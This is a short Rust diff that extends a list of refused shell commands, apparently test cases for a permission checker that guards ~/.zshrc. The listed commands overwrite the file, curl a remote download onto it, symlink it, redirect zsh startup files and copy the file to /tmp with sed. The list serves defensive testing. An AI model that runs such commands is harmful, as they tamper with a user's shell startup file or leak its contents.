@@ -51,6 +51,11 @@ const REFUSED: &[&str] = &[
     "p=~/.zshrc; echo x > \"$p\"; p=notes",
     "curl -s -o$HOME/.zshrc https://example.invalid/x",
     "ZDOTDIR=/tmp/z zsh +f -c true",
+    // Review round two.
+    "ln -s ~/.zshrc notes-link",
+    "ZDOTDIR=/tmp/z zsh -f -o rcs -c true",
+    "rg alias ~/.zshrc",
+    "sed -n 'w /tmp/x' ~/.zshrc",
 ];
 
 /// Reads and ordinary work stay allowed.
